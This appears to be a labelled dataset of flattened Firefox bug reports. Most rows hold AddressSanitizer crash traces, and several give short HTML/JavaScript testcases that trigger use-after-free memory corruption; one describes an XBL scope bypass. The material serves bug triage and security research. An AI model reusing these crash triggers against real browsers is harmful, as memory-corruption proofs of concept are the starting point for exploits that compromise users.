nssubdocumentframe reflowfinished builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nssubdocumentframe.cpp:701:0 35 in presshell handlepostedreflowcallbacks bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nspresshell.cpp:3702:0 36 in presshell diddoreflow bool bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nspresshell.cpp:7663:0 37 in presshell processreflowcommands bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nspresshell.cpp:7996:0 38 in presshell flushpendingnotifications mozilla changestoflush builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nspresshell.cpp:3896:0 39 in nsdocument flushpendingnotifications mozflushtype builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsdocument.cpp:7087:0 40 in nsdocument flushpendingnotifications mozflushtype builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsdocument.cpp:7065:0 41 in nsdocloader docloaderisempty bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/uriloader/base/nsdocloader.cpp:709:0 42 in nsdocloader onstoprequest nsirequest nsisupports tag_nsresult builds/slave/m-cen-l64-asan-ntly-0000000000/build/uriloader/base/nsdocloader.cpp:639:0 43 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports tag_nsresult builds/slave/m-cen-l64-asan-ntly-0000000000/build/uriloader/base/nsdocloader.cpp:642:0 44 in nsloadgroup removerequest nsirequest nsisupports tag_nsresult builds/slave/m-cen-l64-asan-ntly-0000000000/build/netwerk/base/src/nsloadgroup.cpp:684:0 45 in nsdocument dounblockonload builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsdocument.cpp:7967:0 46 in nsdocument unblockonload bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsdocument.cpp:7895:0 47 in nsdocument dispatchcontentloadedevents builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/nsdocument.cpp:4685:0 48 in nsrunnablemethodimpl void nsdocument true run builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/content/base/src dist/include/nsthreadutils.h:350:0 49 in nsthread processnextevent bool bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/xpcom/threads/nsthread.cpp:621:0 50 in ns_processnextevent nsithread bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/xpcom/build/nsthreadutils.cpp:238:0 51 in mozilla ipc messagepump run base messagepump delegate builds/slave/m-cen-l64-asan-ntly-0000000000/build/ipc/glue/messagepump.cpp:81:0 52 in messageloop runinternal builds/slave/m-cen-l64-asan-ntly-0000000000/build/ipc/chromium/src/base/message_loop.cc:219:0 53 in messageloop runhandler builds/slave/m-cen-l64-asan-ntly-0000000000/build/ipc/chromium/src/base/message_loop.cc:212:0 54 in messageloop run builds/slave/m-cen-l64-asan-ntly-0000000000/build/ipc/chromium/src/base/message_loop.cc:186:0 55 in nsbaseappshell run builds/slave/m-cen-l64-asan-ntly-0000000000/build/widget/xpwidgets/nsbaseappshell.cpp:163:0 56 in nsappstartup run builds/slave/m-cen-l64-asan-ntly-0000000000/build/toolkit/components/startup/nsappstartup.cpp:269:0 57 in xremain xre_mainrun builds/slave/m-cen-l64-asan-ntly-0000000000/build/toolkit/xre/nsapprunner.cpp:3858:0 58 in xremain xre_main int char nsxreappdata const builds/slave/m-cen-l64-asan-ntly-0000000000/build/toolkit/xre/nsapprunner.cpp:3926:0 59 in xre_main builds/slave/m-cen-l64-asan-ntly-0000000000/build/toolkit/xre/nsapprunner.cpp:4128:0 60 in do_main int char nsifile builds/slave/m-cen-l64-asan-ntly-0000000000/build/browser/app/nsbrowserapp.cpp:272:0 61 in main builds/slave/m-cen-l64-asan-ntly-0000000000/build/browser/app/nsbrowserapp.cpp:632:0 62 in 0 63 in start is located 4504 bytes inside of 8192-byte region freed by thread t0 here 0 in interceptor_free asan_rtl_:0 1 in freearenalist builds/slave/m-cen-l64-asan-ntly-0000000000/build/nsprpub/lib/ds/plarena.c:273:0 2 in pl_finisharenapool builds/slave/m-cen-l64-asan-ntly-0000000000/build/nsprpub/lib/ds/plarena.c:313:0 3 in presshell presshell builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/base/nspresshell.cpp:747:0 4 in nseditingsession setupeditoronwindow nsidomwindow builds/slave/m-cen-l64-asan-ntly-0000000000/build/editor/composer/src/nseditingsession.cpp:332:0 5 in nseditingsession makewindoweditable nsidomwindow char const bool bool bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/editor/composer/src/nseditingsession.cpp:168:0 6 in nshtmldocument editingstatechanged builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/nshtmldocument.cpp:2871:0 7 in nsrunnablemethodimpl void nshtmldocument true run builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/content/html/document/src dist/include/nsthreadutils.h:350:0 8 in nsautoscriptblocker builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/content/base/src dist/include/nscontentutils.h:2248:0 9 in nsautoscriptblocker builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/content/base/src dist/include/nscontentutils.h:2247:0 10 in mozilla dom element setattr int nsiatom nsiatom nsastring_internal const bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/base/src/element.cpp:1629:0 11 in nsicontent setattr int nsiatom nsastring_internal const bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/obj-firefox/layout/generic dist/include/nsicontent.h:350:0 12 in nsgfxscrollframeinner setcoordattribute nsicontent nsiatom int builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.cpp:3859:0 13 in nsgfxscrollframeinner updatescrollbarposition builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.cpp:2941:0 14 in nsgfxscrollframeinner scrolltoimpl nspoint nsrect const builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.cpp:2012:0 15 in nsgfxscrollframeinner scrolltowithorigin nspoint nsiscrollableframe scrollmode nsiatom nsrect const builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.cpp:1651:0 16 in nsgfxscrollframeinner scrollto nspoint nsiscrollableframe scrollmode nsrect const builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.h:172:0 17 in nshtmlscrollframe scrollto nspoint nsiscrollableframe scrollmode nsrect const builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.h:524:0 18 in non-virtual thunk to nshtmlscrollframe scrollto nspoint nsiscrollableframe scrollmode nsrect const builds/slave/m-cen-l64-asan-ntly-0000000000/build/layout/generic/nsgfxscrollframe.cpp:4099:0 19 in mozilla dom imagedocument scrollimageto int int bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/imagedocument.cpp:379:0 20 in mozilla dom imagedocument shrinktofit builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/imagedocument.cpp:336:0 21 in mozilla dom imagedocument checkoverflowing bool builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/imagedocument.cpp:636:0 22 in non-virtual thunk to mozilla dom imagedocument handleevent nsidomevent builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/html/document/src/imagedocument.cpp:565:0 23 in nseventlistenermanager handleeventinternal nsprescontext nsevent nsidomevent mozilla dom eventtarget nseventstatus nscxpusher builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nseventlistenermanager.cpp:1012:0 24 in nseventtargetchainitem currenttarget builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nseventlistenermanager.h:328:0 25 in nseventtargetchainitem handleevent nseventchainpostvisitor elmcreationdetector nscxpusher builds/slave/m-cen-l64-asan-ntly-0000000000/build/content/events/src/nseventdispatcher.cpp:221:0 previously allocated by thread t0 here 0 in malloc asan_rtl_:0 1 in pl_arenaallocate builds/slave/m-cen-l64-asan-ntly-0000000000/build/nsprpub/lib/ds/plarena.c:200:0 shadow bytes around the buggy address fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 45947==aborting	9
memory corruption in nsgfxscrollframeinner isltr the attached testcase crashes firefox stable and nightly the testcase is attached in a zip file as it requires multiple files to trigger the debugger output on windows eax=0101020d ebx=00000000 ecx=00020000 edx=0000000f esi=0018e260 edi=0018e1d4 eip=645f875d esp=0018e148 ebp=0a154aa0 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210202 xul nsgfxscrollframeinner isltr 645f875d 803801 cmp byte ptr eax 1 ds:0023:0101020d xul nsgfxscrollframeinner isltr xul nshtmlscrollframe reflowcontents xul nshtmlscrollframe reflow xul nscontainerframe reflowchild xul viewportframe reflow xul presshell doreflow xul presshell processreflowcommands xul presshell flushpendingnotifications xul nsrefreshdriver tick xul mozilla refreshdrivertimer tick xul nstimerimpl fire xul nsthread processnextevent xul ns_processnextevent xul mozilla ipc messagepump run xul messageloop runhandler xul messageloop run xul nsbaseappshell run xul nsappshell run xul xremain xre_mainrun xul xremain xre_main asan on linux does n't give us any further information asan sigsegv 7971==error addresssanitizer segv on unknown address pc sp bp t0 addresssanitizer can not provide additional info 0 in nsgfxscrollframeinner isltr const builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsgfxscrollframe.cpp:3302:0 1 in nsgfxscrollframeinner getscrolledrectinternal nsrect const nssize const const builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsgfxscrollframe.cpp:3983:0 2 in nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsgfxscrollframe.cpp:574:0 3 in nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsgfxscrollframe.cpp:783:0 4 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nscontainerframe.cpp:970:0 5 in viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int builds/slave/m-cen-l64-asan-000000000000000/build/layout/generic/nsviewportframe.cpp:225:0 6 in presshell doreflow nsiframe bool builds/slave/m-cen-l64-asan-000000000000000/build/layout/base/nspresshell.cpp:7850:0 7 in presshell processreflowcommands bool builds/slave/m-cen-l64-asan-000000000000000/build/layout/base/nspresshell.cpp:7991:0 8 in presshell flushpendingnotifications mozilla changestoflush builds/slave/m-cen-l64-asan-000000000000000/build/layout/base/nspresshell.cpp:3890:0 9 in nsrefreshdriver tick long mozilla timestamp builds/slave/m-cen-l64-asan-000000000000000/build/layout/base/nsrefreshdriver.cpp:1191:0 10 in mozilla refreshdrivertimer tickdriver nsrefreshdriver long mozilla timestamp builds/slave/m-cen-l64-asan-000000000000000/build/layout/base/nsrefreshdriver.cpp:171:0 11 in mozilla refreshdrivertimer tick builds/slave/m-cen-l64-asan-000000000000000/build/layout/base/nsrefreshdriver.cpp:163:0 12 in nstimerimpl fire builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/threads/nstimerimpl.cpp:544:0 13 in nstimerevent run builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/threads/nstimerimpl.cpp:628:0 14 in nsthread processnextevent bool bool builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/threads/nsthread.cpp:622:0 15 in ns_processnextevent nsithread bool builds/slave/m-cen-l64-asan-000000000000000/build/obj-firefox/xpcom/build/nsthreadutils.cpp:238:0 16 in mozilla ipc messagepump run base messagepump delegate builds/slave/m-cen-l64-asan-000000000000000/build/ipc/glue/messagepump.cpp:81:0 17 in messageloop runinternal builds/slave/m-cen-l64-asan-000000000000000/build/ipc/chromium/src/base/message_loop.cc:220:0 18 in messageloop runhandler builds/slave/m-cen-l64-asan-000000000000000/build/ipc/chromium/src/base/message_loop.cc:213:0 19 in messageloop run builds/slave/m-cen-l64-asan-000000000000000/build/ipc/chromium/src/base/message_loop.cc:187:0 20 in nsbaseappshell run builds/slave/m-cen-l64-asan-000000000000000/build/widget/xpwidgets/nsbaseappshell.cpp:163:0 21 in nsappstartup run builds/slave/m-cen-l64-asan-000000000000000/build/toolkit/components/startup/nsappstartup.cpp:269:0 22 in xremain xre_mainrun builds/slave/m-cen-l64-asan-000000000000000/build/toolkit/xre/nsapprunner.cpp:3858:0 23 in xremain xre_main int char nsxreappdata const builds/slave/m-cen-l64-asan-000000000000000/build/toolkit/xre/nsapprunner.cpp:3926:0 24 in xre_main builds/slave/m-cen-l64-asan-000000000000000/build/toolkit/xre/nsapprunner.cpp:4128:0 25 in do_main int char nsifile builds/slave/m-cen-l64-asan-000000000000000/build/browser/app/nsbrowserapp.cpp:275:0 26 in main builds/slave/m-cen-l64-asan-000000000000000/build/browser/app/nsbrowserapp.cpp:635:0 27 in 0 28 in start 7971==aborting	11
accessor user-defined properties on dom proxies get the wrong this object the expando object if you load the attached testcase you get an exception when you should get the htmloptionelement the reason is this callstack 11 in js_getpropertybyid cx objarg idarg asbits 4643216832 vp js mutablehandlebase js value js mutablevalueoperations js mutablehandle js value js unbarrieredmutablevalueoperations js mutablehandle js value js valueoperations js mutablehandle js value no data fields no data fields no data fields no data fields ptr at jsapi.cpp:3753 12 in mozilla dom htmlselectelementbinding domproxyhandler get this cx proxy js handlebase jsobject no data fields ptr receiver js handlebase jsobject no data fields ptr id js handlebase jsid no data fields ptr vp js mutablehandlebase js value js mutablevalueoperations js mutablehandle js value js unbarrieredmutablevalueoperations js mutablehandle js value js valueoperations js mutablehandle js value no data fields no data fields no data fields no data fields ptr at htmlselectelementbinding.cpp:1313 13 in js proxy get cx proxy js handlebase jsobject no data fields ptr receiver js handlebase jsobject no data fields ptr id js handlebase jsid no data fields ptr vp js mutablehandlebase js value js mutablevalueoperations js mutablehandle js value js unbarrieredmutablevalueoperations js mutablehandle js value js valueoperations js mutablehandle js value no data fields no data fields no data fields no data fields ptr at jsproxy.cpp:2487 and now we re doing the get on the expando object and that s what the getter will see this is bad because if you just use a scripted getter you get the expando object as this going to mark as security-sensitive for that reason	11
crash on long pages neverending reddit with images enabled 1 install reddit enhancement suite 2 enable neverending reddit 3 enable inline images 4 click on show images 5 start browsing 17 pages opened 6 crash i do n't think this is because of reddit enhancement suite but that firefox simply ca n't handle a page that gets this long with this amount of images and other content loaded	11
using xbl scopes its possible to steal clone native anonymous content user agent mozilla/5.0 windows nt 6.1 wow64 rv:23.0 gecko/20100101 firefox/23.0 beta/release build id 20130814063812 steps to reproduce i used an iframe with a data url to load an xml file to get access to the observe function that xml pretty print bindings provide i then used this function and some finagling to get fully anonymous content appended as a child of content that was accessible from the xml iframe this works because the observe function shares the scope with other anonymous content that might be provided with other bindings i believe its actually a cross-compartment wrapper bypass the interesting part is that once the anonymous content that is inaccessible is the child of content i can access that clonenode true clones that content and makes a fully accessible clone i cant help but reference my bug here which points out way back then that this would probably come to pass ill be cc'ing bholley on this one because i mentioned it to him some months back now i just have n't had time at all lately to focus on security research and i m even using my day off for labor day weekend to get this public asap i ve also noticed that in the newest nightly these xul elements i m cloning have become htmldivelements i assume that change is to mitigate future problems like this and maybe in those instances someone would n't even realize that they had gained access to native anonymous content as i ve said i have very little time lately so please fill in the blanks and correct me on what i m wrong about here thanks actual results using this technique i was able to clone an xul element being provided as anonymous content from the pluginproblem.xml bindings expected results the reference to the xul element that can be obtained by using document.getanonymousnodes/document.getanonymouselementbyattribute should not allow itself to be appended to the content accessible from the xml iframe	2
crash in skia anonymous namespace convolvehorizontally int unsigned char const skia convolutionfilter1d const unsigned char user agent mozilla/5.0 windows nt 6.1 wow64 rv:26.0 gecko/20100101 firefox/26.0 beta/release build id 20130906030202 steps to reproduce 1 disable hardware acceleration 2 restart firefox 3 go to 4 open a new tab actual results browser crash see crash report bp-da1fdfd7-0c61-4dfb-9aa8-ab2f32130907	7
stack-buffer-overflow in txxpathnodeutils getbaseuri 12693==error addresssanitizer stack-buffer-overflow on address at pc bp sp read of size 8 at thread t0 0 in txxpathnodeutils getbaseuri txxpathnode const nsastring_internal content/xslt/src/xpath/txmozillaxpathtreewalker.cpp:569 1 in txloadeddocumentshash txloadeddocumentshash content/xslt/src/xslt/txexecutionstate.cpp:39 2 in txexecutionstate txexecutionstate content/xslt/src/xslt/txexecutionstate.cpp:94 3 in txmozillaxsltprocessor transformtodoc nsidomdocument bool content/xslt/src/xslt/txmozillaxsltprocessor.cpp:679 4 in ns_invokebyindex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 5 in invoke js/xpconnect/src/xpcwrappednative.cpp:2809 6 in callmethodhelper js/xpconnect/src/xpcwrappednative.cpp:2149 7 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode js/xpconnect/src/xpcwrappednative.cpp:2115 8 in xpc_wn_callmethod jscontext unsigned int js value js/xpconnect/src/xpcwrappednativejsops.cpp:1310 9 in native js/src/jscntxtinlines.h:219 10 in js invoke jscontext js callargs js maybeconstruct js/src/vm/interpreter.cpp:489 11 in interpret jscontext js runstate js/src/vm/interpreter.cpp:2459 12 in js runscript jscontext js runstate js/src/vm/interpreter.cpp:446 13 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js abstractframeptr js value js/src/vm/interpreter.cpp:630 14 in js execute jscontext js handle jsscript jsobject js value js/src/vm/interpreter.cpp:666 15 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value js/src/jsapi.cpp:5120 16 in nsjsutils evaluatestring jscontext nsastring_internal const js handle jsobject js compileoptions nsjsutils evaluateoptions js value dom/base/nsjsutils.cpp:268 17 in nsjscontext evaluatestring nsastring_internal const js handle jsobject js compileoptions bool js value dom/base/nsjsenvironment.cpp:993 18 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext dom/base/nsglobalwindow.cpp:10473 19 in nsglobalwindow runtimeout nstimeout dom/base/nsglobalwindow.cpp:10717 20 in nsglobalwindow timercallback nsitimer void dom/base/nsglobalwindow.cpp:10964 21 in nstimerimpl fire xpcom/threads/nstimerimpl.cpp:546 22 in nstimerevent run xpcom/threads/nstimerimpl.cpp:630 23 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:622 24 in ns_processnextevent nsithread bool objdir-ff-asan/xpcom/build/nsthreadutils.cpp:238 25 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:116 26 in runinternal ipc/chromium/src/base/message_loop.cc:220 27 in runhandler ipc/chromium/src/base/message_loop.cc:213 28 in messageloop run ipc/chromium/src/base/message_loop.cc:187 29 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:161 30 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:269 31 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3869 32 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3937 33 in xre_main toolkit/xre/nsapprunner.cpp:4139 34 in do_main browser/app/nsbrowserapp.cpp:275 35 in main browser/app/nsbrowserapp.cpp:635 36 in 37 in start address is located in stack of thread t0 at offset 896 in frame 0 in txmozillaxsltprocessor transformtodoc nsidomdocument bool content/xslt/src/xslt/txmozillaxsltprocessor.cpp:629 this frame has 4 object s 32 40 sourcedomdocument 96 784 es 832 872 handlerfactory 928 936 doc hint this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext longjmp and c exceptions are supported shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f4 f4 f2 f2 f2 f2 00 00 00 00 00 f4 f4 f4 f2 f2 f2 f2 00 f4 f4 f4 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 f4 f4 f2 f2 f2 f2 00 00 00 00 00 00 00 00 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 12693==aborting	11
asan heap-use-after-free in nsipresshell getprescontext with canvas onresize and moztextstyle the following testcase crashes the firefox asan build html script function start o14=document.createelement iframe o14.src data text/html body id='e0 body document.getelementbyid s appendchild o14 window.settimeout startrly 100 function startrly o101=o14.contentdocument.getelementbyid e0 o130=document.createelement canvas o131=o130.getcontext 2d o154=o130 o101.appendchild o154 o14.contentwindow.onresize=cb_frameresize_25_1 o14.width 1 window.scroll 175,961 o131.moztextstyle function cb_frameresize_25_1 document.body.appendchild document.getelementbyid s script body onload start div id s div body html	11
heap-use-after-free in nscontentutils contentishostincludingdescendantof need to install jesse s fuzzpriv extension 19928==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in get objdir-ff-asan/content/base/src dist/include/nscomptr.h:800 1 in operator objdir-ff-asan/content/base/src dist/include/nscomptr.h:820 2 in nodetype objdir-ff-asan/content/base/src dist/include/nsinode.h:506 3 in nscontentutils contentishostincludingdescendantof nsinode const nsinode const content/base/src/nscontentutils.cpp:1862 4 in isallowedaschild nsicontent nsinode bool nsinode content/base/src/nsinode.cpp:1542 5 in nsinode replaceorinsertbefore bool nsinode nsinode mozilla errorresult content/base/src/nsinode.cpp:1747 6 in insertbefore objdir-ff-asan/dom/bindings dist/include/nsinode.h:1515 7 in mozilla dom nodebinding insertbefore jscontext js handle jsobject nsinode jsjitmethodcallargs const objdir-ff-asan/dom/bindings/nodebinding.cpp:477 8 in mozilla dom nodebinding genericmethod jscontext unsigned int js value objdir-ff-asan/dom/bindings/nodebinding.cpp:1230 9 in native js/src/jscntxtinlines.h:218 10 in js invoke jscontext js callargs js maybeconstruct js/src/vm/interpreter.cpp:478 11 in interpret jscontext js runstate js/src/vm/interpreter.cpp:2454 12 in js runscript jscontext js runstate js/src/vm/interpreter.cpp:435 13 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js abstractframeptr js value js/src/vm/interpreter.cpp:619 14 in js execute jscontext js handle jsscript jsobject js value js/src/vm/interpreter.cpp:655 15 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value js/src/jsapi.cpp:4897 16 in nsjsutils evaluatestring jscontext nsastring_internal const js handle jsobject js compileoptions nsjsutils evaluateoptions js value void dom/base/nsjsutils.cpp:280 17 in nsjscontext evaluatestring nsastring_internal const js handle jsobject js compileoptions bool js value void dom/base/nsjsenvironment.cpp:994 18 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext dom/base/nsglobalwindow.cpp:10489 19 in nsglobalwindow runtimeout nstimeout dom/base/nsglobalwindow.cpp:10733 20 in nsglobalwindow timercallback nsitimer void dom/base/nsglobalwindow.cpp:10980 21 in nstimerimpl fire xpcom/threads/nstimerimpl.cpp:546 22 in nstimerevent run xpcom/threads/nstimerimpl.cpp:630 23 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:622 24 in ns_processnextevent nsithread bool objdir-ff-asan/xpcom/build/nsthreadutils.cpp:238 25 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:116 26 in runinternal ipc/chromium/src/base/message_loop.cc:220 27 in runhandler ipc/chromium/src/base/message_loop.cc:213 28 in messageloop run ipc/chromium/src/base/message_loop.cc:187 29 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:161 30 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:269 31 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3869 32 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3937 33 in xre_main toolkit/xre/nsapprunner.cpp:4139 34 in do_main browser/app/nsbrowserapp.cpp:275 35 in main browser/app/nsbrowserapp.cpp:635 36 in 37 in start is located 32 bytes inside of 144-byte region freed by thread t0 here 0 in free asan_rtl 1 in snowwhitekiller snowwhitekiller xpcom/base/nscyclecollector.cpp:1993 2 in nscyclecollector_dodeferreddeletion xpcom/base/nscyclecollector.cpp:3153 3 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:622 4 in ns_processnextevent nsithread bool objdir-ff-asan/xpcom/build/nsthreadutils.cpp:238 5 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:81 6 in runinternal ipc/chromium/src/base/message_loop.cc:220 7 in runhandler ipc/chromium/src/base/message_loop.cc:213 8 in messageloop run ipc/chromium/src/base/message_loop.cc:187 9 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:161 10 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3937 11 in xre_main toolkit/xre/nsapprunner.cpp:4139 12 in do_main browser/app/nsbrowserapp.cpp:275 13 in main browser/app/nsbrowserapp.cpp:635 14 in previously allocated by thread t0 here 0 in malloc asan_rtl 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 19928==aborting	11
fix asan use-after-free in nsioservice newchannelfromuriwithproxyflags with blob url the following testcase crashes the nightly asan build script function start o103=document.createelement iframe o168=new blob type image/gif window.blob=url.createobjecturl o168 document.body.appendchild o103 o299=document.createelement script o300=document.createtextnode cb1 o299.appendchild o300 document.documentelement.appendchild o299 function cb1 o103.src=blob o103.contentwindow.onresize=cb2 function cb2 o103.src=blob script body onload start body	11
use of uninitialized memory and buffer size computations not checked for overflow i observed this use of uninitialized memory in the js shell running under valgrind on ubuntu precise x86-64 21933 conditional jump or move depends on uninitialised value s 21933 at inflatereset2 inflate.c:157 21933 by inflateinit2 inflate.c:193 21933 by js decompressstring unsigned char const unsigned long unsigned char unsigned long jsutil.cpp:132 21933 by jsruntime initselfhosting jscontext selfhosting.cpp:753 21933 by js newcontext jsruntime unsigned long jscntxt.cpp:201 21933 by js_newcontext jsruntime unsigned long jsapi.cpp:827 21933 by newcontext jsruntime js.cpp:4914 21933 by main js.cpp:5546 this bug is caused by code in jsutil.cpp allocating memory for zlib using regular malloc where zlib expects the memory to be zeroed while investigating this i also noticed that the multiplication computing the buffer size for the malloc call is not checked for overflow informally looking around i found a few other places that were performing unchecked multiplications to compute buffer sizes attached is a patch which fixes all of the bugs i found the change in jsd_lock.cpp is a boring cleanup the change in utility.h introduces an overload of js_calloc with two arguments this is used by the jsutil.cpp fixes described below the changes in baselinebailouts.cpp and ioncode.h add overflow checks on multiplications computing buffer sizes it might be impossible to force overflows in these places because other things would very likely fail first but there was n't anything explicitly protecting them this patch explicitly protects them the change in jsutil.cpp fixes two bugs it zeros out the allocated memory which fixes the uninitialized memory bug described above and it uses the two-argument calloc allowing libc to check the multiplication for overflow	11
asan use-after free in gc allocation in nseventlistenermanager seteventhandler the attached testcase crashes the nightly asan build it require domfuzzlite3 asan output attached in stack.txt	11
